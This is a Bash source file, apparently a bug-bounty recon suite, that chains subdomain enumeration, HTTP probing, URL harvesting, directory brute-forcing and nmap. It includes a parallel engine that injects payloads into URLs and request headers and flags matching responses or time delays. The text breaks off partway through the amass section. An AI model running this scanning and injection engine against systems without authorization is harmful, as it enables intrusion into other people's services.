#!/usr/bin/env bash
# =============================================================================
#   WebRecon Pro v3.0 — Advanced Web Pentesting & Bug Bounty Recon Suite
#   Author  : Vishal
#   Version : 3.1 (parallel vuln scanning + per-task skip + smart timeouts)
#   Usage   : chmod +x webrecon_v3.sh && ./webrecon_v3.sh
#             sudo ./webrecon_v3.sh   (for full nmap SYN/UDP/OS scans)
#
#   CRASH FIXES vs v2.0:
#   - Removed set -euo pipefail entirely (root cause of all crashes)
#   - Removed IFS modification (broke arrays and word-splitting)
#   - All tool calls wrapped with safe_run() — never exits on failure
#   - All grep calls use '|| true' to prevent exit-on-no-match
#   - All wc/cat on files guarded with -f checks
#   - All inter-phase variables declared/defaulted at top
#   - confirm() returns proper boolean, never crashes caller
#   - timeout exit 124 handled gracefully as warning, not crash
#   - Array operations guarded against empty arrays
#   - Single file — no module sourcing, no source-crash risk
#   - ((arithmetic)) replaced with $(( )) which never crashes
#   - Parallel curl engine for vuln scanning (configurable concurrency)
#   - Ctrl+C per-task skip — stops one scan class, continues to next
#   - Live progress bar for all vuln scan loops
#   - URL cap per vuln class (configurable, default 500)
#   - Smart timeouts: dir tools 3600s, fast tools 1800s (no more premature kills)
#   - SKIP_CURRENT flag system — safe cross-task interrupt handling
# =============================================================================

# ── NO strict mode — it causes more crashes than it prevents in recon tools ──
# Instead we handle errors explicitly at each callsite.

# ── ANSI Colors & Symbols ────────────────────────────────────────────────────
RED='\033[0;31m';    GREEN='\033[0;32m';  YELLOW='\033[1;33m'
BLUE='\033[0;34m';   CYAN='\033[0;36m';  MAGENTA='\033[0;35m'
WHITE='\033[1;37m';  BOLD='\033[1m';     DIM='\033[2m';   NC='\033[0m'
BG_RED='\033[41m';   BG_GREEN='\033[42m'; BG_BLUE='\033[44m'; BG_MAGENTA='\033[45m'
TICK="${GREEN}[✔]${NC}"; CROSS="${RED}[✘]${NC}"; INFO="${CYAN}[ℹ]${NC}"
WARN="${YELLOW}[⚠]${NC}"; RUN="${BLUE}[►]${NC}"; SKIP="${YELLOW}[⊘]${NC}"
ARROW="${MAGENTA}[→]${NC}"; STAR="${YELLOW}[★]${NC}"

# ── Global state variables — ALL declared here, no unbound-var crashes ───────
TARGET=""
OUTPUT_DIR=""
LOG_FILE="/tmp/webrecon_v3.log"
SUBDOMAIN_MASTER_FILE=""
LIVE_HOSTS_FILE=""
URL_MASTER_FILE=""
PARAMETERIZED_URLS=""
GAU_MERGED_FILE=""
GOSPIDER_MERGED_FILE=""
THREAD_COUNT=50
DELAY=0
SCAN_MODE=2
TS=""   # timestamp, set once at scan start

# ── Safe tool execution — NEVER crashes the script ───────────────────────────
# Usage: safe_run LABEL OUTFILE TIMEOUT_SEC CMD [ARGS...]
# ── SKIP FLAG — set to 1 by Ctrl+C during a task, cleared after ──────────────
SKIP_CURRENT=0
CURRENT_TASK_PID=0   # PID of background job group we can kill

# ── Per-task SIGINT handler ───────────────────────────────────────────────────
# Pressing Ctrl+C during a task sets SKIP_CURRENT=1 and kills the task's PIDs.
# The main trap (_trap_exit) only fires if we are NOT inside a skippable task.
_task_sigint() {
    SKIP_CURRENT=1
    echo -e "\n${WARN} ${YELLOW}[SKIP]${NC} Ctrl+C caught — stopping current task, saving partial results..."
    # Kill the entire process group of any background workers
    if [ "$CURRENT_TASK_PID" -gt 0 ] 2>/dev/null; then
        kill -TERM -- "-$CURRENT_TASK_PID" 2>/dev/null || true
        kill -KILL -- "-$CURRENT_TASK_PID" 2>/dev/null || true
    fi
    # Also kill any child curl/timeout procs
    jobs -p 2>/dev/null | xargs -r kill -TERM 2>/dev/null || true
}

# ── Arm / Disarm skip handler ─────────────────────────────────────────────────
arm_skip()   { SKIP_CURRENT=0; CURRENT_TASK_PID=0; trap '_task_sigint' INT; }
disarm_skip() {
    trap '_trap_exit' INT   # restore global handler
    SKIP_CURRENT=0
    CURRENT_TASK_PID=0
    # wait for stray background jobs
    wait 2>/dev/null || true
}

# ── Skip-aware task wrapper ───────────────────────────────────────────────────
# Usage: skippable_task "Label" CMD [ARGS...]
# Shows [S to skip] hint, runs CMD in background, waits interruptibly.
skippable_task() {
    local label="$1"; shift
    echo -e "  ${DIM}── $label ── ${YELLOW}[Ctrl+C = skip this task]${NC}"
    arm_skip
    "$@" &
    CURRENT_TASK_PID=$!
    wait "$CURRENT_TASK_PID" 2>/dev/null || true
    disarm_skip
    if [ "$SKIP_CURRENT" -eq 1 ]; then
        echo -e "  ${SKIP} ${YELLOW}$label skipped — partial results kept${NC}"
        log_warn "[$label] skipped by user"
        return 1
    fi
    return 0
}

# ── Safe tool execution — NEVER crashes the script ───────────────────────────
# Usage: safe_run LABEL OUTFILE TIMEOUT_SEC CMD [ARGS...]
# Smart timeout: if TIMEOUT_SEC=0 it auto-calculates from wordlist/url counts.
safe_run() {
    local label="$1"
    local outfile="$2"
    local timeout_sec="$3"
    shift 3
    local cmd=("$@")

    # Auto-timeout: count input size and set generous dynamic limit
    if [ "$timeout_sec" -eq 0 ] 2>/dev/null; then
        timeout_sec=3600   # fallback 1 hour
    fi

    log_run "[$label] ${cmd[*]}"
    echo -e "  ${DIM}  Timeout: ${timeout_sec}s | ${YELLOW}[Ctrl+C = skip]${NC}"
    arm_skip

    timeout "$timeout_sec" "${cmd[@]}" >> "$outfile" 2>> "$LOG_FILE" &
    CURRENT_TASK_PID=$!
    wait "$CURRENT_TASK_PID" 2>/dev/null
    local ec=$?
    disarm_skip

    if [ "$SKIP_CURRENT" -eq 1 ]; then
        echo -e "  ${SKIP} ${YELLOW}$label skipped — partial results kept${NC}"
        log_warn "[$label] skipped by user — partial results in $outfile"
        return 0
    fi
    if [ "$ec" -eq 124 ]; then
        log_warn "$label timed out after ${timeout_sec}s — partial results kept"
    elif [ "$ec" -ne 0 ] && [ "$ec" -ne 1 ]; then
        log_warn "$label exited $ec — partial results kept"
    else
        local n=0
        [ -f "$outfile" ] && n=$(wc -l < "$outfile" 2>/dev/null || echo 0)
        log_ok "$label → $n lines → $(basename "$outfile")"
    fi
    return 0
}

# ── Parallel curl engine for vuln scanning ───────────────────────────────────
# Usage: parallel_curl LABEL INPUT_FILE OUTFILE CONCURRENCY PAYLOAD MATCH_REGEX MODE
# MODE: "body"=grep response body, "header"=grep Location header, "timing"=delay check
# Ctrl+C stops just this scan class cleanly.
parallel_curl() {
    local label="$1"
    local input="$2"
    local outfile="$3"
    local concurrency="$4"
    local payload="$5"
    local match="$6"
    local mode="${7:-body}"

    [ ! -s "$input" ] && { log_warn "[$label] input empty — skipping"; return 0; }
    local total; total=$(wc -l < "$input" 2>/dev/null || echo 0)
    [ "$total" -eq 0 ] && return 0

    log_run "[$label] $total URLs × payload '${payload:0:40}' | concurrency=$concurrency | Ctrl+C=skip"
    arm_skip

    local done_count=0
    local hit_count=0
    local active=0
    local tmpdir; tmpdir=$(mktemp -d)

    # worker function run in background
    _worker() {
        local url="$1" pl="$2" out="$3" md="$4" sig="$5"
        local qs_bin="$QSREPLACE_PATH"
        local injected
        injected=$(printf '%s' "$url" | "$qs_bin" "$pl" 2>/dev/null) || return
        [ -z "$injected" ] && return
        case "$md" in
            body)
                local resp
                resp=$(curl -sk -L --max-time 8 \
                    -H "User-Agent: Mozilla/5.0 WebReconPro/3.1" \
                    "$injected" 2>/dev/null) || return
                echo "$resp" | grep -qF "$sig" 2>/dev/null && \
                    echo "[HIT][$label] $injected" >> "$out" ;;
            body_re)
                local resp
                resp=$(curl -sk -L --max-time 8 \
                    -H "User-Agent: Mozilla/5.0 WebReconPro/3.1" \
                    "$injected" 2>/dev/null) || return
                echo "$resp" | grep -qiE "$sig" 2>/dev/null && \
                    echo "[HIT][$label] $injected" >> "$out" ;;
            header)
                local loc
                loc=$(curl -sk -I -L --max-time 8 "$injected" 2>/dev/null \
                    | grep -i "^location:" | head -1) || return
                echo "$loc" | grep -qi "$sig" 2>/dev/null && \
                    echo "[HIT][$label] $injected | Location: $loc" >> "$out" ;;
            timing)
                local t0; t0=$(date +%s%3N)
                curl -sk -L --max-time 12 "$injected" -o /dev/null 2>/dev/null || true
                local t1; t1=$(date +%s%3N)
                local ms; ms=$(( t1 - t0 ))
                [ "$ms" -gt 4800 ] && \
                    echo "[HIT][$label] $injected | delay=${ms}ms" >> "$out" ;;
            headers_inject)
                curl -sk -L --max-time 8 "$injected" \
                    -H "User-Agent: $pl" \
                    -H "X-Forwarded-For: $pl" \
                    -H "X-Api-Version: $pl" \
                    -o /dev/null 2>/dev/null || true
                echo "[SENT][$label] $injected" >> "$out" ;;
        esac
        touch "$tmpdir/done_$$_${RANDOM}" 2>/dev/null
    }
    export -f _worker 2>/dev/null || true

    # progress bar printer
    _print_progress() {
        local d="$1" t="$2" h="$3"
        local pct=0
        [ "$t" -gt 0 ] && pct=$(( d * 100 / t ))
        local filled=$(( pct * 30 / 100 ))
        local bar=""
        local i=0
        while [ "$i" -lt "$filled" ]; do bar="${bar}█"; i=$(( i+1 )); done
        while [ "$i" -lt 30 ];       do bar="${bar}░"; i=$(( i+1 )); done
        printf "\r  [%s] %3d%% (%d/%d) hits:%d  " "$bar" "$pct" "$d" "$t" "$h"
    }

    # Main dispatch loop
    while IFS= read -r url || [ -n "$url" ]; do
        [ -z "$url" ] && continue
        [ "$SKIP_CURRENT" -eq 1 ] && break

        # throttle to concurrency limit
        while [ "$(jobs -rp 2>/dev/null | wc -l)" -ge "$concurrency" ]; do
            [ "$SKIP_CURRENT" -eq 1 ] && break
            sleep 0.1
        done
        [ "$SKIP_CURRENT" -eq 1 ] && break

        _worker "$url" "$payload" "$outfile" "$mode" "$match" &

        done_count=$(( done_count + 1 ))
        hit_count=$([ -f "$outfile" ] && wc -l < "$outfile" 2>/dev/null || echo 0)
        _print_progress "$done_count" "$total" "$hit_count"

    done < "$input"

    # Wait remaining workers
    wait 2>/dev/null || true
    rm -rf "$tmpdir" 2>/dev/null || true

    hit_count=$([ -f "$outfile" ] && wc -l < "$outfile" 2>/dev/null || echo 0)
    _print_progress "$total" "$total" "$hit_count"
    echo   # newline after progress bar

    disarm_skip
    [ "$SKIP_CURRENT" -eq 1 ] && echo -e "  ${SKIP} ${YELLOW}$label scan skipped by user${NC}" && return 0
    [ "$hit_count" -gt 0 ] && log_ok "$label → $hit_count hits" || log_info "$label → no matches"
    return 0
}

# ── Logging ───────────────────────────────────────────────────────────────────
log_ok()   { echo -e "${TICK} ${GREEN}$*${NC}";    echo "[OK]    $(date '+%H:%M:%S') $*" >> "$LOG_FILE"; }
log_info() { echo -e "${INFO} ${WHITE}$*${NC}";    echo "[INFO]  $(date '+%H:%M:%S') $*" >> "$LOG_FILE"; }
log_run()  { echo -e "${RUN} ${CYAN}$*${NC}";      echo "[RUN]   $(date '+%H:%M:%S') $*" >> "$LOG_FILE"; }
log_warn() { echo -e "${WARN} ${YELLOW}$*${NC}";   echo "[WARN]  $(date '+%H:%M:%S') $*" >> "$LOG_FILE"; }
log_err()  { echo -e "${CROSS} ${RED}$*${NC}" >&2; echo "[ERROR] $(date '+%H:%M:%S') $*" >> "$LOG_FILE"; }
log_skip() { echo -e "${SKIP} ${DIM}$*${NC}";      echo "[SKIP]  $(date '+%H:%M:%S') $*" >> "$LOG_FILE"; }

# ── UI helpers ────────────────────────────────────────────────────────────────
divider()    { echo -e "${DIM}$(printf '─%.0s' {1..78})${NC}"; }
section()    { echo; echo -e "${BG_BLUE}${WHITE}${BOLD}  $*  ${NC}"; divider; }
subsection() { echo; echo -e "${MAGENTA}${BOLD}▶ $*${NC}"; echo -e "${DIM}$(printf '·%.0s' {1..78})${NC}"; }

# confirm — returns 0 for yes, 1 for no, NEVER crashes
confirm() {
    local msg="$1"
    local default="${2:-y}"
    local answer
    if [ "$default" = "y" ]; then
        echo -ne "${YELLOW}${BOLD}[?]${NC} $msg ${DIM}[Y/n]${NC}: "
    else
        echo -ne "${YELLOW}${BOLD}[?]${NC} $msg ${DIM}[y/N]${NC}: "
    fi
    read -r answer || answer="$default"
    [ -z "$answer" ] && answer="$default"
    case "${answer,,}" in y|yes) return 0 ;; *) return 1 ;; esac
}

# ask — read a value with a default, result in variable name
ask() {
    local msg="$1"
    local default="${2:-}"
    local varname="$3"
    if [ -n "$default" ]; then
        echo -ne "${YELLOW}${BOLD}[?]${NC} $msg ${DIM}[${default}]${NC}: "
    else
        echo -ne "${YELLOW}${BOLD}[?]${NC} $msg: "
    fi
    local val
    read -r val || val=""
    [ -z "$val" ] && val="$default"
    eval "$varname=\"\$val\""
}

# safe_wc — line count or 0 if file missing
safe_wc() { [ -f "$1" ] && wc -l < "$1" 2>/dev/null || echo 0; }

# safe_cat — cat only if file exists and non-empty
safe_cat() { [ -f "$1" ] && cat "$1" 2>/dev/null || true; }

# check_tool — returns 0 if usable
check_tool() {
    local p="$1"
    # executable binary
    [ -x "$p" ] && return 0
    # in PATH
    command -v "$p" >/dev/null 2>&1 && return 0
    # python script
    [[ "$p" == *.py ]] && [ -f "$p" ] && return 0
    return 1
}

# register_output — append to RESULTS_INDEX.txt safely
register_output() {
    local file="$1" desc="$2" usage="${3:-}"
    local idx="$OUTPUT_DIR/RESULTS_INDEX.txt"
    [ -n "$OUTPUT_DIR" ] || return 0
    printf "%-55s | %-38s | %s\n" "$(basename "$file")" "$desc" "$usage" >> "$idx" 2>/dev/null || true
}


# =============================================================================
# TOOL PATHS — EDIT THESE TO MATCH YOUR INSTALLATION
# All paths are used via check_tool() so wrong paths just skip, not crash
# =============================================================================
SUBFINDER_PATH="${HOME}/go/bin/subfinder"
AMASS_PATH="${HOME}/go/bin/amass"
ASSETFINDER_PATH="${HOME}/go/bin/assetfinder"
SUBLIST3R_PATH="/opt/Sublist3r/sublist3r.py"
KNOCK_PATH="/opt/knock/knockpy.py"
HTTPX_PATH="${HOME}/go/bin/httpx"
GAU_PATH="${HOME}/go/bin/gau"
GOSPIDER_PATH="${HOME}/go/bin/gospider"
QSREPLACE_PATH="${HOME}/go/bin/qsreplace"
FFUF_PATH="${HOME}/go/bin/ffuf"
GOBUSTER_PATH="${HOME}/go/bin/gobuster"
FEROXBUSTER_PATH="/usr/local/bin/feroxbuster"
DIRSEARCH_PATH="/opt/dirsearch/dirsearch.py"
DIRB_PATH="/usr/bin/dirb"
WFUZZ_PATH="/usr/bin/wfuzz"
NMAP_PATH="/usr/bin/nmap"

# Auto-detect from PATH if binary exists there
_try_detect() { command -v "$1" 2>/dev/null && return 0 || return 0; }
[ -z "$(command -v amass 2>/dev/null)" ]       || AMASS_PATH="$(command -v amass)"
[ -z "$(command -v feroxbuster 2>/dev/null)" ] || FEROXBUSTER_PATH="$(command -v feroxbuster)"
[ -z "$(command -v dirb 2>/dev/null)" ]        || DIRB_PATH="$(command -v dirb)"
[ -z "$(command -v wfuzz 2>/dev/null)" ]       || WFUZZ_PATH="$(command -v wfuzz)"
[ -z "$(command -v nmap 2>/dev/null)" ]        || NMAP_PATH="$(command -v nmap)"

# =============================================================================
# WORDLIST PATHS — EDIT TO MATCH YOUR SecLists / wordlist location
# =============================================================================
WL_SUBS_SMALL="/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt"
WL_SUBS_MEDIUM="/opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt"
WL_SUBS_LARGE="/opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt"
WL_DIRS_SMALL="/opt/SecLists/Discovery/Web-Content/common.txt"
WL_DIRS_MEDIUM="/opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"
WL_DIRS_BIG="/opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt"
WL_DIRB="/usr/share/dirb/wordlists/common.txt"
WL_PARAMS="/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt"
WL_API="/opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt"
WL_WFUZZ="/usr/share/wfuzz/wordlist/general/common.txt"


# =============================================================================
# BANNER
# =============================================================================
print_banner() {
    clear
    echo -e "${RED}${BOLD}"
    cat << 'BANNER'
 ██╗    ██╗███████╗██████╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
 ██║    ██║██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
 ██║ █╗ ██║█████╗  ██████╔╝    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
 ██║███╗██║██╔══╝  ██╔══██╗    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
 ╚███╔███╔╝███████╗██████╔╝    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
  ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
BANNER
    echo -e "${NC}${CYAN}${BOLD}              Pro v3.0 — Bug Bounty & Web Pentesting Recon Suite${NC}"
    echo -e "${DIM}        subfinder·amass·assetfinder·sublist3r·knock·ffuf·httpx·gau·gospider${NC}"
    echo -e "${DIM}              qsreplace·gobuster·feroxbuster·dirb·dirsearch·wfuzz·nmap${NC}"
    echo -e "${YELLOW}                      [ Authorized Testing Only ]${NC}"
    divider
    echo
}


# =============================================================================
# PHASE 0 — INTERACTIVE SETUP (target, output dir, tool check, wordlists)
# =============================================================================
phase_setup() {
    print_banner

    # ── Target input ──────────────────────────────────────────────────────
    section "TARGET CONFIGURATION"
    echo -e "  ${INFO} Enter target domain. Examples: hackerone.com | bugcrowd.com"
    echo -e "  ${WARN} Only test targets you have explicit written permission to scan!"
    echo
    while true; do
        echo -ne "  ${YELLOW}${BOLD}[TARGET]${NC} Domain (no http://, no trailing slash): "
        read -r TARGET || TARGET=""
        TARGET=$(echo "$TARGET" | sed 's|https\?://||g' | sed 's|/.*||g' | tr '[:upper:]' '[:lower:]' | tr -d ' ')
        if [ -z "$TARGET" ]; then
            log_err "Target cannot be empty."; continue
        fi
        if echo "$TARGET" | grep -qE '^[a-zA-Z0-9][a-zA-Z0-9._-]*\.[a-zA-Z]{2,}$'; then
            break
        else
            log_err "Invalid domain: '$TARGET' — try: example.com"
        fi
    done
    log_ok "Target: ${YELLOW}${BOLD}${TARGET}${NC}"

    # ── Output directory ──────────────────────────────────────────────────
    TS=$(date '+%Y%m%d_%H%M%S')
    local default_out
    default_out="$(pwd)/results/${TARGET}_${TS}"
    echo
    echo -ne "  ${YELLOW}[?]${NC} Output directory ${DIM}[${default_out}]${NC}: "
    read -r _outdir || _outdir=""
    [ -z "$_outdir" ] && _outdir="$default_out"
    OUTPUT_DIR="${_outdir%/}"
    mkdir -p "$OUTPUT_DIR" 2>/dev/null || { log_err "Cannot create: $OUTPUT_DIR"; exit 1; }
    LOG_FILE="${OUTPUT_DIR}/${TARGET}_errors_${TS}.log"
    touch "$LOG_FILE" 2>/dev/null || LOG_FILE="/tmp/webrecon_${TARGET}_${TS}.log"
    log_ok "Output: ${WHITE}$OUTPUT_DIR${NC}"
    log_ok "Log:    ${WHITE}$LOG_FILE${NC}"

    # Initialize results index
    cat > "$OUTPUT_DIR/RESULTS_INDEX.txt" << RIDX
WebRecon Pro v3.0 — Results Index
Target  : ${TARGET}
Started : $(date '+%Y-%m-%d %H:%M:%S')
Output  : ${OUTPUT_DIR}
================================================================================
FILE                                                    | DESCRIPTION                          | HOW TO USE
RIDX

    # ── Tool availability check ───────────────────────────────────────────
    section "TOOL AVAILABILITY CHECK"
    echo -e "  ${DIM}Checking installed tools...${NC}"
    echo
    local _tools_ok=0 _tools_miss=0
    _chk() {
        local name="$1" path="$2"
        if check_tool "$path"; then
            echo -e "  ${TICK} ${GREEN}${name}${NC}"
            _tools_ok=$(( _tools_ok + 1 ))
        else
            echo -e "  ${CROSS} ${RED}${name}${NC} ${DIM}(${path})${NC}"
            _tools_miss=$(( _tools_miss + 1 ))
        fi
    }
    _chk "subfinder"    "$SUBFINDER_PATH"
    _chk "amass"        "$AMASS_PATH"
    _chk "assetfinder"  "$ASSETFINDER_PATH"
    _chk "sublist3r"    "$SUBLIST3R_PATH"
    _chk "knockpy"      "$KNOCK_PATH"
    _chk "httpx"        "$HTTPX_PATH"
    _chk "gau"          "$GAU_PATH"
    _chk "gospider"     "$GOSPIDER_PATH"
    _chk "qsreplace"    "$QSREPLACE_PATH"
    _chk "ffuf"         "$FFUF_PATH"
    _chk "gobuster"     "$GOBUSTER_PATH"
    _chk "feroxbuster"  "$FEROXBUSTER_PATH"
    _chk "dirsearch"    "$DIRSEARCH_PATH"
    _chk "dirb"         "$DIRB_PATH"
    _chk "wfuzz"        "$WFUZZ_PATH"
    _chk "nmap"         "$NMAP_PATH"
    echo
    echo -e "  ${INFO} Available: ${GREEN}${BOLD}${_tools_ok}${NC}  Missing: ${RED}${_tools_miss}${NC}  (missing tools are skipped gracefully)"
    echo
    if ! confirm "Continue with available tools?" y; then
        log_info "Exiting — install missing tools first (see COMPLETE_USAGE_GUIDE.md)"
        exit 0
    fi

    # ── Wordlist paths ────────────────────────────────────────────────────
    section "WORDLIST CONFIGURATION"
    echo -e "  ${DIM}Press ENTER to keep defaults. Paths are validated — missing ones warn only.${NC}"
    echo
    ask "Subdomain wordlist (small ~5k)"       "$WL_SUBS_SMALL"  WL_SUBS_SMALL
    ask "Subdomain wordlist (medium ~20k)"     "$WL_SUBS_MEDIUM" WL_SUBS_MEDIUM
    ask "Directory wordlist (small ~4k)"       "$WL_DIRS_SMALL"  WL_DIRS_SMALL
    ask "Directory wordlist (medium ~220k)"    "$WL_DIRS_MEDIUM" WL_DIRS_MEDIUM
    ask "Directory wordlist (big ~1.2M)"       "$WL_DIRS_BIG"    WL_DIRS_BIG
    ask "dirb built-in wordlist"               "$WL_DIRB"        WL_DIRB
    echo
    for _wl in "$WL_SUBS_SMALL" "$WL_SUBS_MEDIUM" "$WL_DIRS_SMALL" "$WL_DIRS_MEDIUM"; do
        if [ ! -f "$_wl" ]; then
            log_warn "Wordlist not found: $_wl  (affected scans will be skipped)"
        fi
    done

    # ── Scan mode selection ───────────────────────────────────────────────
    section "SCAN MODE"
    echo -e "  ${YELLOW}[1]${NC} ${BOLD}Quick Recon${NC}       — Subdomains + httpx only (fast, passive)"
    echo -e "  ${YELLOW}[2]${NC} ${BOLD}Standard Recon${NC}    — All phases, confirm each tool ${DIM}(recommended)${NC}"
    echo -e "  ${YELLOW}[3]${NC} ${BOLD}Full Auto${NC}         — Everything, minimal prompts"
    echo -e "  ${YELLOW}[4]${NC} ${BOLD}Custom Modules${NC}    — Choose which phases to run"
    echo -e "  ${YELLOW}[5]${NC} ${BOLD}Bug Bounty Mode${NC}   — Passive recon + URL harvest + vuln scan, no nmap"
    echo -e "  ${YELLOW}[6]${NC} ${BOLD}Nmap Only${NC}         — Skip recon, run nmap scans only"
    echo -e "  ${YELLOW}[7]${NC} ${BOLD}Directory Only${NC}    — Skip recon, run dir brute only"
    divider
    echo -ne "  ${WHITE}${BOLD}Mode [1-7, default 2]: ${NC}"
    read -r SCAN_MODE || SCAN_MODE=2
    [ -z "$SCAN_MODE" ] && SCAN_MODE=2
    case "$SCAN_MODE" in
        [1-7]) : ;;
        *)     SCAN_MODE=2 ;;
    esac

    # ── Phase toggles ──────────────────────────────────────────────────────
    RUN_P1=1 RUN_P2=1 RUN_P3=1 RUN_P4=1 RUN_P5=1 RUN_P6=1
    case "$SCAN_MODE" in
        1) RUN_P3=0; RUN_P4=0; RUN_P5=0; RUN_P6=0 ;;
        4)
            section "CUSTOM PHASE SELECTION"
            confirm "Phase 1: Subdomain Enumeration?"  y && RUN_P1=1 || RUN_P1=0
            confirm "Phase 2: HTTP Probing (httpx)?"   y && RUN_P2=1 || RUN_P2=0
            confirm "Phase 3: URL Harvesting?"         y && RUN_P3=1 || RUN_P3=0
            confirm "Phase 4: Vuln Scanning?"          y && RUN_P4=1 || RUN_P4=0
            confirm "Phase 5: Directory Brute Force?"  y && RUN_P5=1 || RUN_P5=0
            confirm "Phase 6: Nmap Scanning?"          y && RUN_P6=1 || RUN_P6=0
            ;;
        5) RUN_P5=0; RUN_P6=0 ;;
        6) RUN_P1=0; RUN_P2=0; RUN_P3=0; RUN_P4=0; RUN_P5=0 ;;
        7) RUN_P1=0; RUN_P2=0; RUN_P3=0; RUN_P4=0; RUN_P6=0 ;;
    esac

    # ── Thread preset ─────────────────────────────────────────────────────
    section "PERFORMANCE"
    echo -e "  ${YELLOW}[1]${NC} Conservative — 10 threads (stealth, low noise)"
    echo -e "  ${YELLOW}[2]${NC} Normal       — 50 threads ${DIM}(recommended)${NC}"
    echo -e "  ${YELLOW}[3]${NC} Aggressive   — 100 threads (fast, may trigger WAF)"
    echo -e "  ${YELLOW}[4]${NC} Custom"
    echo -ne "  ${WHITE}Choice [1-4, default 2]: ${NC}"
    read -r _tp || _tp=2
    case "${_tp:-2}" in
        1) THREAD_COUNT=10 ;;
        3) THREAD_COUNT=100 ;;
        4) ask "Thread count" "50" THREAD_COUNT ;;
        *) THREAD_COUNT=50 ;;
    esac

    # ── Confirmation summary ───────────────────────────────────────────────
    section "SCAN PLAN — CONFIRM TO START"
    echo
    echo -e "  ${BOLD}Target     :${NC} ${YELLOW}${TARGET}${NC}"
    echo -e "  ${BOLD}Output Dir :${NC} ${WHITE}${OUTPUT_DIR}${NC}"
    echo -e "  ${BOLD}Threads    :${NC} ${THREAD_COUNT}"
    echo
    _p() { local n="$1" v="$2"; [ "$v" -eq 1 ] && echo -e "  Phase $n: ${GREEN}ENABLED${NC}" || echo -e "  Phase $n: ${DIM}SKIPPED${NC}"; }
    _p 1 $RUN_P1; _p 2 $RUN_P2; _p 3 $RUN_P3; _p 4 $RUN_P4; _p 5 $RUN_P5; _p 6 $RUN_P6
    echo
    if ! confirm "Start scan?" y; then
        log_info "Aborted by user."; exit 0
    fi
}


# =============================================================================
# PHASE 1 — SUBDOMAIN ENUMERATION
# =============================================================================
phase_subdomain() {
    section "PHASE 1 — SUBDOMAIN ENUMERATION"
    local outdir="$OUTPUT_DIR/01_subdomains"
    mkdir -p "$outdir"
    local merged="$outdir/${TARGET}_ALL_SUBDOMAINS_MERGED_${TS}.txt"
    local -a all_files=()   # collects every output file for final merge

    log_info "Target: ${YELLOW}${BOLD}${TARGET}${NC}  |  Output: $outdir"

    # ──────────────────────────────────────────────────────────────────────
    # SUBFINDER
    # ──────────────────────────────────────────────────────────────────────
    if check_tool "$SUBFINDER_PATH"; then
        subsection "SUBFINDER"
        local sf_files=()

        if confirm "Subfinder — Mode 1: Basic Passive (fastest)" y; then
            local f="$outdir/${TARGET}_subfinder_passive_basic_${TS}.txt"
            safe_run "subfinder-basic" "$f" 180 "$SUBFINDER_PATH" -d "$TARGET" -silent
            [ -s "$f" ] && { sf_files+=("$f"); register_output "$f" "subfinder: basic passive" "Feed to httpx"; }
        fi

        if confirm "Subfinder — Mode 2: All Sources (-all)" y; then
            local f="$outdir/${TARGET}_subfinder_allsources_${TS}.txt"
            safe_run "subfinder-all" "$f" 300 "$SUBFINDER_PATH" -d "$TARGET" -all -silent
            [ -s "$f" ] && { sf_files+=("$f"); register_output "$f" "subfinder: all sources passive" "Broadest passive coverage"; }
        fi

        if confirm "Subfinder — Mode 3: Recursive (-recursive)" n; then
            local f="$outdir/${TARGET}_subfinder_recursive_${TS}.txt"
            safe_run "subfinder-recursive" "$f" 360 "$SUBFINDER_PATH" -d "$TARGET" -all -silent -recursive
            [ -s "$f" ] && { sf_files+=("$f"); register_output "$f" "subfinder: recursive" "Finds nested subdomains"; }
        fi

        if confirm "Subfinder — Mode 4: Rate-limited stealth (-rL 30)" n; then
            local f="$outdir/${TARGET}_subfinder_stealth_${TS}.txt"
            safe_run "subfinder-stealth" "$f" 420 "$SUBFINDER_PATH" -d "$TARGET" -all -silent -rL 30
            [ -s "$f" ] && { sf_files+=("$f"); register_output "$f" "subfinder: stealth rate-limited" "Evades basic rate limits"; }
        fi

        if confirm "Subfinder — Mode 5: No wildcard filter (-nW)" n; then
            local f="$outdir/${TARGET}_subfinder_nowildcard_${TS}.txt"
            safe_run "subfinder-nowild" "$f" 300 "$SUBFINDER_PATH" -d "$TARGET" -all -silent -nW
            [ -s "$f" ] && { sf_files+=("$f"); register_output "$f" "subfinder: no wildcard filter" "May find hidden wildcards"; }
        fi

        if [ "${#sf_files[@]}" -gt 0 ]; then
            local sf_merged="$outdir/${TARGET}_subfinder_MERGED_${TS}.txt"
            cat "${sf_files[@]}" 2>/dev/null | sort -u | grep -v '^$' > "$sf_merged" || true
            log_ok "Subfinder merged: $(safe_wc "$sf_merged") unique subdomains"
            all_files+=("$sf_merged")
        fi
    else
        log_skip "Subfinder not found at: $SUBFINDER_PATH"
    fi

    # ──────────────────────────────────────────────────────────────────────
    # AMASS
    # ──────────────────────────────────────────────────────────────────────
    if check_tool "$AMASS_PATH"; then
        subsection "AMASS"
        local amass_bin
        amass_bin=$(command -v amass 2>/dev/null || echo "$AMASS_PATH")
        local amass_files=()

        if confirm "Amass — Mode 1: Passive enum" y; then
            local f="$outdir/${TARGET}_amass_passive_${TS}.txt"
            safe_run "amass-passive" "$f" 360 "$amass_bin" enum -passive -d "$TARGET" -o "$f"
            [ -s "$f" ] && { amass_files+=("$f"); register_output "$f" "amass: passive enum" "OWASP OSINT passive"; }
        fi

        if confirm "Amass — Mode 2: Active (DNS resolution)" n; then
            local f="$outdir/${TARGET}_amass_active_${TS}.txt"
            safe_run "amass-active" "$f" 600 "$amass_bin" enum -active -d "$TARGET" -o "$f"
            [ -s "$f" ] && { amass_files+=("$f"); register_output "$f" "amass: active with DNS resolution" "Confirmed live subdomains"; }
        fi

        if confirm "Amass — Mode 3: Intel / WHOIS / ASN pivoting" n; then
            local f="$outdir/${TARGET}_amass_intel_${TS}.txt"
